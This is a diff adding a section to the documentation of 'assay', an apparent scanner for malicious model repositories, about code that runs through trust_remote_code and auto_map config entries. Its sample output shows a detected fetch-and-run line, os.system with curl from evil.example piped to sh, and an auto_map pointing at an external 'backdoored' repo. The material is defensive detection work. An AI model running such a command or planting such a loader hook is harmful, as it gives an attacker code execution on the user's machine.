@@ -238,6 +238,63 @@ Pickle findings:
 
 ---
 
+### 2.2b Code shipped with the weights (trust_remote_code)
+
+Pickle is not the only way a model runs code on your machine. It is not even
+the most common one any more.
+
+```
+        config.json                         modeling_foo.py
+        ┌───────────────────────────┐       ┌──────────────────────────┐
+        │ "auto_map": {             │       │ import os                │
+        │   "AutoModelForCausalLM": │──────>│ os.system("curl …|sh")   │ <- runs
+        │     "modeling_foo.MyModel"│       │                          │    on
+        │ }                         │       │ class MyModel(...):      │  import
+        └───────────────────────────┘       └──────────────────────────┘
+                    ▲
+        from_pretrained(..., trust_remote_code=True)
+        imports the module BEFORE reading a single weight
+```
+
+The weights in that repo can be a spotless `safetensors` file. It does not
+matter: the payload never touches them.
+
+So `assay` treats the repo as the unit of risk. Every `.py` next to a model
+becomes an artifact with its own verdict and file hash, and the configs are
+parsed to find out which files a loader would actually execute:
+
+```
+./repo/model.safetensors  [safetensors]  -> CLEAN
+./repo/modeling_evil.py   [python]       -> UNTRUSTED
+  [high] REMOTE_CODE_AUTO_MAP: config.json routes 1 loader entry point(s) to
+         this file; from_pretrained(trust_remote_code=True) imports it ...
+      - AutoModelForCausalLM -> modeling_evil.MyModel
+  [high] PY_DANGEROUS_CALL: shell command execution via os.system at module
+         level, so it runs the moment the module is imported
+      - line 4: os.system("curl -s https://evil.example/x.sh | sh")
+./repo/convert.py         [python]       -> CLEAN
+  [low]  REMOTE_CODE_PRESENT: nothing points a loader at it, but it is one
+         import away from running
+```
+
+**Where it runs decides how bad it is.** A dangerous call at column 0 executes
+on import, so it is `high`. The same call inside a function body only runs when
+something calls it, so it is `medium`. Matching is call-aware: `model.eval()`
+and `torch.compile()` are ordinary torch code, not `eval(` and `compile(`.
+
+**The nastiest variant** is the mapping that does not point anywhere in the
+repo at all:
+
+```json
+"auto_map": { "AutoModel": "sketchy-org/backdoored--modeling_x.Model" }
+```
+
+That `--` form means the code is fetched from *another* repo at load time. You
+can audit every byte you downloaded and still be executing someone else's code.
+`assay` flags it `REMOTE_CODE_EXTERNAL`, on the config file that declares it.
+
+---
+
 ### 2.3 safetensors structural validation
 
 `safetensors` is **safe by design** (no code), but still has format-level attack
